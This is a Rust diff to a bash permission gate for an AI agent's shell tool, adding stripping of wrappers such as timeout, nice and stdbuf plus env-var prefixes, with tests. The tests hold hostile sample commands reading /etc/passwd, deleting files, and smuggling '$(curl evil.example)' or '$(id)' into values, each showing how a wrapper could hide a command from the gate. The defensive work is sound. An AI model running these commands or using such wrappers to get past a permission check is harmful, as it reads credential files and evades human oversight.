@@ -11,10 +11,6 @@
 //!
 //! ## Out of scope (deferred slices)
 //!
-//! - **Wrapper stripping (S9)** — `timeout 5 cat /etc/passwd` collapsing to
-//!   `cat /etc/passwd` requires porting `stripSafeWrappers` (HackerOne-level
-//!   multi-line regex, see `claude-code-main/.../bashPermissions.ts:524`).
-//!   Tracked as 3.1.B.2 follow-up.
 //! - **Hook wireup** — making `BashValidationHook::before_tool_call` actually
 //!   call [`check_path_constraints`] and emit `DecisionReason::PathOutOfWorkspace`
 //!   is Phase 3.1.C.
@@ -155,7 +151,11 @@ pub fn check_path_constraints(
     };
 
     for argv in &commands {
-        let Some((base, args)) = argv.split_first() else {
+        // Phase 3.1.B.2: peel safe wrappers (time/nohup/timeout/nice/stdbuf)
+        // so the *real* base command is dispatched. Mirrors upstream
+        // `stripWrappersFromArgv` (claude-code-main/.../bashPermissions.ts:677).
+        let stripped = strip_wrappers_from_argv(argv);
+        let Some((base, args)) = stripped.split_first() else {
             continue;
         };
         let Some(cmd) = PathCommand::parse(base) else {
@@ -220,9 +220,11 @@ fn extract_commands_for_path_check(
 fn extract_argv(cmd: Node<'_>, src: &[u8]) -> Result<Vec<String>, &'static str> {
     let mut argv = Vec::new();
     let mut cursor = cmd.walk();
+    let mut seen_command_name = false;
     for child in cmd.named_children(&mut cursor) {
         match child.kind() {
             "command_name" => {
+                seen_command_name = true;
                 let inner = child
                     .named_child(0)
                     .ok_or("command_name without inner word")?;
@@ -239,12 +241,18 @@ fn extract_argv(cmd: Node<'_>, src: &[u8]) -> Result<Vec<String>, &'static str> 
             "string" => argv.push(literal_double_quoted(child, src)?),
             "raw_string" => argv.push(literal_raw_string(child, src)?),
             "concatenation" => argv.push(literal_concatenation(child, src)?),
-            // `variable_assignment` like `FOO=bar cmd` — we don't
-            // currently strip these (3.1.B.2 wrapper stripping will). Treat
-            // as Fail-Closed so that env-var smuggling can't bypass the
-            // gate.
+            // Phase 3.1.B.2: `variable_assignment` like `FOO=bar cmd` —
+            // tree-sitter-bash emits these as named children that appear
+            // BEFORE `command_name`. They are AST-level env-var prefixes,
+            // not argv tokens, so we skip them (the AST already gave us the
+            // structural separation upstream achieves via regex). Values
+            // bearing runtime expansion (`FOO=$(curl evil)`) Fail-Closed.
             "variable_assignment" => {
-                return Err("leading variable assignment requires wrapper stripping (S9)");
+                if seen_command_name {
+                    return Err("variable assignment after command name");
+                }
+                check_variable_assignment_literal(child, src)?;
+                continue;
             }
             // Any expansion / substitution → can't classify literally.
             "simple_expansion"
@@ -306,6 +314,303 @@ fn literal_concatenation(node: Node<'_>, src: &[u8]) -> Result<String, &'static 
         out.push_str(&literal_word(child, src)?);
     }
     Ok(out)
+}
+
+/// Verify that a `variable_assignment` node's *value* is a static literal
+/// (no command substitution, parameter expansion, arithmetic, or process
+/// substitution). The name side is always a literal `variable_name`.
+///
+/// We deliberately do **not** consult a safe-list of variable names here —
+/// the argv-level path gate corresponds to upstream `stripAllLeadingEnvVars`
+/// (bashPermissions.ts:732): for path validation we want to peel *any*
+/// literal env prefix so the real command can be classified. Allow-rule
+/// matching applies the safe-list separately at a higher layer.
+fn check_variable_assignment_literal(node: Node<'_>, src: &[u8]) -> Result<(), &'static str> {
+    let mut cursor = node.walk();
+    for child in node.named_children(&mut cursor) {
+        match child.kind() {
+            // Literal name parts.
+            "variable_name" | "subscript" => continue,
+            // Literal value parts — re-validate via the same literal-word
+            // gate used for argv so quoted forms with expansion are caught.
+            "word" | "number" | "raw_string" => continue,
+            "string" => {
+                literal_double_quoted(child, src)?;
+            }
+            "concatenation" => {
+                literal_concatenation(child, src)?;
+            }
+            "array" => return Err("env-var array assignment is not statically classifiable"),
+            "simple_expansion"
+            | "expansion"
+            | "command_substitution"
+            | "process_substitution"
+            | "arithmetic_expansion" => {
+                return Err("env-var value contains runtime expansion");
+            }
+            _ => return Err("env-var assignment has unrecognized AST node"),
+        }
+    }
+    Ok(())
+}
+
+/// Argv-level wrapper stripper. Mirrors upstream `stripWrappersFromArgv`
+/// (claude-code-main/src/tools/BashTool/bashPermissions.ts:677).
+///
+/// Peels iteratively while the head matches one of:
+///
+/// - `time` / `nohup` — bare wrapper, optional `--` after
+/// - `timeout [flags] <duration> …` — flag set per [`skip_timeout_flags`]
+/// - `nice [-n N | -N]?` — bare / `-n N` / `-N` forms, optional `--` after
+/// - `stdbuf -i… -o… -e…` — at least one fused IO-buffer flag, optional `--`
+///
+/// SECURITY: an unrecognized form (e.g. `timeout -k$(id) 5 ls` where the
+/// fused short flag fails `[A-Za-z0-9_.+-]+` validation) returns the input
+/// **unchanged**. That keeps `baseCmd='timeout'` outside the
+/// [`PathCommand`] dispatch table, which is Fail-Closed because callers
+/// have already Fail-Closed Ask'd on the runtime expansion in
+/// `extract_argv`.
+///
+/// SECURITY PIN **S9**: `timeout 5 cat /etc/passwd`, `nice rm -rf /tmp/x`,
+/// `time cat /etc/passwd`, `nohup -- rm /tmp/sec`, `stdbuf -o0 cat /etc/passwd`
+/// must all reach [`validate_command_paths`] under the real base command,
+/// not silently passthrough on the wrapper name.
+#[must_use]
+pub(crate) fn strip_wrappers_from_argv(argv: &[String]) -> &[String] {
+    let mut a = argv;
+    loop {
+        let Some(head) = a.first() else { return a };
+        let consumed = match head.as_str() {
+            "time" | "nohup" => peel_simple_wrapper(a),
+            "timeout" => peel_timeout(a),
+            "nice" => peel_nice(a),
+            "stdbuf" => peel_stdbuf(a),
+            _ => return a,
+        };
+        match consumed {
+            Some(n) if n <= a.len() => {
+                let next = &a[n..];
+                // Defensive: if we somehow didn't make progress, abort to
+                // avoid an infinite loop. (Cannot trigger with current
+                // peel_* helpers but keeps the loop total.)
+                if next.len() == a.len() {
+                    return a;
+                }
+                a = next;
+            }
+            // Cannot consume (unparseable flags, or out-of-bounds slice).
+            // Return what we have — upstream also bails out unchanged.
+            _ => return a,
+        }
+    }
+}
+
+/// Peel `time`/`nohup` and an optional `--` end-of-options marker.
+fn peel_simple_wrapper(a: &[String]) -> Option<usize> {
+    if a.get(1).map(String::as_str) == Some("--") {
+        Some(2)
+    } else {
+        Some(1)
+    }
+}
+
+/// Peel `timeout [flags] <duration>`. Returns the number of tokens to
+/// consume, or `None` if flags or duration are unrecognized.
+fn peel_timeout(a: &[String]) -> Option<usize> {
+    let i = skip_timeout_flags(a)?;
+    let dur = a.get(i)?;
+    if !is_timeout_duration(dur) {
+        return None;
+    }
+    Some(i + 1)
+}
+
+/// Mirror of upstream `skipTimeoutFlags` (bashPermissions.ts:634).
+/// Returns the argv index of the DURATION token after flags, or `None`
+/// when an unrecognized flag is encountered.
+fn skip_timeout_flags(a: &[String]) -> Option<usize> {
+    let mut i = 1;
+    while let Some(arg) = a.get(i) {
+        let arg = arg.as_str();
+        let next = a.get(i + 1).map(String::as_str);
+
+        // Long flags without value.
+        if matches!(arg, "--foreground" | "--preserve-status" | "--verbose") {
+            i += 1;
+        }
+        // Long flags with fused value: --kill-after=5, --signal=TERM.
+        else if let Some(rest) = arg.strip_prefix("--kill-after=") {
+            if !is_timeout_flag_value(rest) {
+                return None;
+            }
+            i += 1;
+        } else if let Some(rest) = arg.strip_prefix("--signal=") {
+            if !is_timeout_flag_value(rest) {
+                return None;
+            }
+            i += 1;
+        }
+        // Long flags with separate value.
+        else if matches!(arg, "--kill-after" | "--signal") {
+            let v = next?;
+            if !is_timeout_flag_value(v) {
+                return None;
+            }
+            i += 2;
+        }
+        // End-of-options marker.
+        else if arg == "--" {
+            i += 1;
+            break;
+        }
+        // Any other long flag: unrecognized, abort.
+        else if arg.starts_with("--") {
+            return None;
+        }
+        // Short flags without value.
+        else if arg == "-v" {
+            i += 1;
+        }
+        // Short -k/-s with separate value.
+        else if matches!(arg, "-k" | "-s") {
+            let v = next?;
+            if !is_timeout_flag_value(v) {
+                return None;
+            }
+            i += 2;
+        }
+        // Short -kVAL / -sVAL fused.
+        else if let Some(rest) = arg.strip_prefix("-k").or_else(|| arg.strip_prefix("-s")) {
+            if rest.is_empty() || !is_timeout_flag_value(rest) {
+                return None;
+            }
+            i += 1;
+        }
+        // Anything else starting with '-' is an unrecognized short flag.
+        else if arg.starts_with('-') {
+            return None;
+        }
+        // Non-flag token: this is the duration; stop scanning.
+        else {
+            break;
+        }
+    }
+    Some(i)
+}
+
+/// Match upstream `TIMEOUT_FLAG_VALUE_RE = /^[A-Za-z0-9_.+-]+$/`.
+fn is_timeout_flag_value(s: &str) -> bool {
+    !s.is_empty()
+        && s.bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'+' | b'-'))
+}
+
+/// Match upstream `/^\d+(?:\.\d+)?[smhd]?$/` for the timeout duration token.
+fn is_timeout_duration(s: &str) -> bool {
+    let bytes = s.as_bytes();
+    if bytes.is_empty() {
+        return false;
+    }
+    let mut i = 0;
+    let mut saw_int = false;
+    while i < bytes.len() && bytes[i].is_ascii_digit() {
+        saw_int = true;
+        i += 1;
+    }
+    if !saw_int {
+        return false;
+    }
+    if i < bytes.len() && bytes[i] == b'.' {
+        i += 1;
+        let frac_start = i;
+        while i < bytes.len() && bytes[i].is_ascii_digit() {
+            i += 1;
+        }
+        if i == frac_start {
+            return false;
+        }
+    }
+    if i < bytes.len() && matches!(bytes[i], b's' | b'm' | b'h' | b'd') {
+        i += 1;
+    }
+    i == bytes.len()
+}
+
+/// Peel `nice` — bare, `nice -n N`, or `nice -N` form.
+fn peel_nice(a: &[String]) -> Option<usize> {
+    let a1 = a.get(1).map(String::as_str);
+    let a2 = a.get(2).map(String::as_str);
+    let n = if a1 == Some("-n") && a2.is_some_and(is_signed_int) {
+        if a.get(3).map(String::as_str) == Some("--") {
+            4
+        } else {
+            3
+        }
+    } else if a1.is_some_and(is_negative_int) {
+        if a.get(2).map(String::as_str) == Some("--") {
+            3
+        } else {
+            2
+        }
+    } else if a1 == Some("--") {
+        2
+    } else {
+        1
+    };
+    Some(n)
+}
+
+/// Match `/^-?\d+$/`.
+fn is_signed_int(s: &str) -> bool {
+    let bytes = s.as_bytes();
+    let mut i = 0;
+    if i < bytes.len() && bytes[i] == b'-' {
+        i += 1;
+    }
+    if i == bytes.len() {
+        return false;
+    }
+    bytes[i..].iter().all(u8::is_ascii_digit)
+}
+
+/// Match `/^-\d+$/`. Note: `-n` is NOT a negative int.
+fn is_negative_int(s: &str) -> bool {
+    s.starts_with('-') && s.len() > 1 && s.as_bytes()[1..].iter().all(u8::is_ascii_digit)
+}
+
+/// Peel `stdbuf -iN -oN -eN …`. Requires at least one fused flag.
+fn peel_stdbuf(a: &[String]) -> Option<usize> {
+    let mut i = 1;
+    while let Some(arg) = a.get(i) {
+        if is_stdbuf_fused_flag(arg) {
+            i += 1;
+        } else {
+            break;
+        }
+    }
+    if i == 1 {
+        // No flags consumed — upstream regex requires at least one.
+        return None;
+    }
+    if a.get(i).map(String::as_str) == Some("--") {
+        Some(i + 1)
+    } else {
+        Some(i)
+    }
+}
+
+/// Match upstream `-[ioe][LN0-9]+`.
+fn is_stdbuf_fused_flag(s: &str) -> bool {
+    let bytes = s.as_bytes();
+    if bytes.len() < 3 || bytes[0] != b'-' {
+        return false;
+    }
+    if !matches!(bytes[1], b'i' | b'o' | b'e') {
+        return false;
+    }
+    bytes[2..]
+        .iter()
+        .all(|&b| matches!(b, b'L' | b'N') || b.is_ascii_digit())
 }
 
 #[cfg(test)]
@@ -492,16 +797,17 @@ mod tests {
     }
 
     #[test]
-    fn cpc_variable_assignment_prefix_failclosed() {
-        // `FOO=bar cat /work/repo/x` — until 3.1.B.2 ports
-        // stripSafeWrappers we can't safely classify; Fail-Closed Ask.
+    fn cpc_variable_assignment_prefix_with_inside_path_passthroughs() {
+        // 3.1.B.2: literal env-var prefixes are now peeled at argv level.
+        // `FOO=bar cat /work/repo/x` should classify under the real base
+        // command `cat` and passthrough because the path is in-workspace.
         let r = check_path_constraints(
             "FOO=bar cat /work/repo/x",
             &cwd(),
             &ws(&["/work/repo"]),
             &home(),
         );
-        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
+        assert_eq!(r, PathValidationOutcome::Passthrough);
     }
 
     #[test]
@@ -550,5 +856,251 @@ mod tests {
             &home(),
         );
         assert_eq!(r, PathValidationOutcome::Passthrough);
+    }
+
+    // ----- 3.1.B.2: env-prefix tolerance + wrapper stripping -----
+
+    fn strs(items: &[&str]) -> Vec<String> {
+        items.iter().map(|s| (*s).to_owned()).collect()
+    }
+
+    #[test]
+    fn swfa_no_wrapper_returns_input_unchanged() {
+        let a = strs(&["cat", "/etc/passwd"]);
+        assert_eq!(strip_wrappers_from_argv(&a), a.as_slice());
+    }
+
+    #[test]
+    fn swfa_time_bare_strips_one() {
+        let a = strs(&["time", "cat", "/etc/passwd"]);
+        assert_eq!(strip_wrappers_from_argv(&a), &a[1..]);
+    }
+
+    #[test]
+    fn swfa_nohup_with_double_dash_strips_two() {
+        let a = strs(&["nohup", "--", "rm", "/tmp/x"]);
+        assert_eq!(strip_wrappers_from_argv(&a), &a[2..]);
+    }
+
+    #[test]
+    fn swfa_timeout_simple_duration_strips() {
+        let a = strs(&["timeout", "5", "cat", "/etc/passwd"]);
+        assert_eq!(strip_wrappers_from_argv(&a), &a[2..]);
+    }
+
+    #[test]
+    fn swfa_timeout_with_suffix_duration_strips() {
+        let a = strs(&["timeout", "10s", "cat", "/etc/passwd"]);
+        assert_eq!(strip_wrappers_from_argv(&a), &a[2..]);
+    }
+
+    #[test]
+    fn swfa_timeout_with_long_flag_fused_value_strips() {
+        let a = strs(&["timeout", "--kill-after=5", "5", "cat", "/etc/passwd"]);
+        assert_eq!(strip_wrappers_from_argv(&a), &a[3..]);
+    }
+
+    #[test]
+    fn swfa_timeout_with_long_flag_separate_value_strips() {
+        let a = strs(&["timeout", "--signal", "TERM", "5", "cat", "/etc/passwd"]);
+        assert_eq!(strip_wrappers_from_argv(&a), &a[4..]);
+    }
+
+    #[test]
+    fn swfa_timeout_with_short_flag_fused_strips() {
+        let a = strs(&["timeout", "-k5", "5", "cat", "/etc/passwd"]);
+        assert_eq!(strip_wrappers_from_argv(&a), &a[3..]);
+    }
+
+    #[test]
+    fn swfa_timeout_with_unrecognized_long_flag_returns_unchanged() {
+        let a = strs(&["timeout", "--evil", "5", "ls"]);
+        assert_eq!(strip_wrappers_from_argv(&a), a.as_slice());
+    }
+
+    #[test]
+    fn swfa_timeout_with_unrecognized_duration_returns_unchanged() {
+        // `.5` (no leading digit) is accepted by GNU timeout but our regex
+        // — matching upstream — requires a leading digit. Returning input
+        // unchanged is Fail-Closed because baseCmd='timeout' is not a
+        // PathCommand and downstream callers Ask on unknown bases.
+        let a = strs(&["timeout", ".5", "ls"]);
+        assert_eq!(strip_wrappers_from_argv(&a), a.as_slice());
+    }
+
+    #[test]
+    fn swfa_nice_bare_strips_one() {
+        let a = strs(&["nice", "rm", "-rf", "/tmp/sec"]);
+        assert_eq!(strip_wrappers_from_argv(&a), &a[1..]);
+    }
+
+    #[test]
+    fn swfa_nice_dash_n_form_strips_three() {
+        let a = strs(&["nice", "-n", "5", "rm", "/tmp/sec"]);
+        assert_eq!(strip_wrappers_from_argv(&a), &a[3..]);
+    }
+
+    #[test]
+    fn swfa_nice_dash_n_legacy_form_strips_two() {
+        let a = strs(&["nice", "-5", "rm", "/tmp/sec"]);
+        assert_eq!(strip_wrappers_from_argv(&a), &a[2..]);
+    }
+
+    #[test]
+    fn swfa_stdbuf_fused_flags_strip() {
+        let a = strs(&["stdbuf", "-o0", "-eL", "cat", "/etc/passwd"]);
+        assert_eq!(strip_wrappers_from_argv(&a), &a[3..]);
+    }
+
+    #[test]
+    fn swfa_stdbuf_no_flags_returns_unchanged() {
+        let a = strs(&["stdbuf", "ls"]);
+        assert_eq!(strip_wrappers_from_argv(&a), a.as_slice());
+    }
+
+    #[test]
+    fn swfa_chained_wrappers_strip_iteratively() {
+        // nohup → timeout → real command.
+        let a = strs(&["nohup", "timeout", "5", "cat", "/etc/passwd"]);
+        assert_eq!(strip_wrappers_from_argv(&a), &a[3..]);
+    }
+
+    #[test]
+    fn swfa_wrapper_only_no_command_returns_empty_slice() {
+        let a = strs(&["nohup"]);
+        let stripped = strip_wrappers_from_argv(&a);
+        assert!(stripped.is_empty());
+    }
+
+    // ----- S9 end-to-end: env prefixes + wrappers must not bypass the gate -----
+
+    #[test]
+    fn s9_timeout_around_cat_etc_passwd_is_ask() {
+        let r = check_path_constraints(
+            "timeout 5 cat /etc/passwd",
+            &cwd(),
+            &ws(&["/work/repo"]),
+            &home(),
+        );
+        assert!(
+            matches!(r, PathValidationOutcome::Ask { .. }),
+            "S9 timeout wrapper must not hide /etc/passwd; got {r:?}"
+        );
+    }
+
+    #[test]
+    fn s9_nice_around_rm_outside_workspace_is_ask() {
+        let r = check_path_constraints(
+            "nice rm -rf /tmp/secret-payload.bin",
+            &cwd(),
+            &ws(&["/work/repo"]),
+            &home(),
+        );
+        assert!(
+            matches!(r, PathValidationOutcome::Ask { .. }),
+            "S9 bare-nice wrapper must not hide rm /tmp/...; got {r:?}"
+        );
+    }
+
+    #[test]
+    fn s9_nohup_double_dash_rm_is_ask() {
+        let r = check_path_constraints(
+            "nohup -- rm /tmp/secret",
+            &cwd(),
+            &ws(&["/work/repo"]),
+            &home(),
+        );
+        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
+    }
+
+    #[test]
+    fn s9_time_around_cat_etc_passwd_is_ask() {
+        let r = check_path_constraints(
+            "time cat /etc/passwd",
+            &cwd(),
+            &ws(&["/work/repo"]),
+            &home(),
+        );
+        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
+    }
+
+    #[test]
+    fn s9_stdbuf_around_cat_etc_passwd_is_ask() {
+        let r = check_path_constraints(
+            "stdbuf -o0 cat /etc/passwd",
+            &cwd(),
+            &ws(&["/work/repo"]),
+            &home(),
+        );
+        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
+    }
+
+    #[test]
+    fn s9_env_prefix_with_wrapper_combo_is_ask() {
+        let r = check_path_constraints(
+            "FOO=bar timeout 5 cat /etc/passwd",
+            &cwd(),
+            &ws(&["/work/repo"]),
+            &home(),
+        );
+        assert!(
+            matches!(r, PathValidationOutcome::Ask { .. }),
+            "env prefix + wrapper combo must reach path gate; got {r:?}"
+        );
+    }
+
+    #[test]
+    fn s9_literal_env_prefix_alone_does_not_block_safe_commands() {
+        // FOO=bar cat src/main.rs (cwd-relative inside workspace) should
+        // still passthrough — env prefix peeling itself must not regress
+        // 3.1.A behaviour.
+        let r = check_path_constraints(
+            "FOO=bar cat src/main.rs",
+            &cwd(),
+            &ws(&["/work/repo"]),
+            &home(),
+        );
+        assert_eq!(r, PathValidationOutcome::Passthrough);
+    }
+
+    #[test]
+    fn s9_env_var_value_with_command_substitution_is_fail_closed_ask() {
+        // FOO=$(curl evil) cmd — runtime expansion in env value cannot be
+        // statically classified → Fail-Closed Ask.
+        let r = check_path_constraints(
+            "FOO=$(curl evil.example) ls",
+            &cwd(),
+            &ws(&["/work/repo"]),
+            &home(),
+        );
+        assert!(
+            matches!(r, PathValidationOutcome::Ask { .. }),
+            "env-var value with command substitution must Fail-Closed Ask; got {r:?}"
+        );
+    }
+
+    #[test]
+    fn s9_timeout_with_substitution_in_flag_value_is_fail_closed_ask() {
+        // `timeout -k$(id) 5 ls` — tree-sitter sees `-k$(id)` as a
+        // concatenation containing command_substitution → extract_argv
+        // Fail-Closed Asks before wrapper stripping ever runs.
+        let r = check_path_constraints(
+            "timeout -k$(id) 5 ls",
+            &cwd(),
+            &ws(&["/work/repo"]),
+            &home(),
+        );
+        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
+    }
+
+    #[test]
+    fn s9_chained_wrappers_do_not_hide_path_violation() {
+        let r = check_path_constraints(
+            "nohup timeout 5 cat /etc/passwd",
+            &cwd(),
+            &ws(&["/work/repo"]),
+            &home(),
+        );
+        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
     }
 }
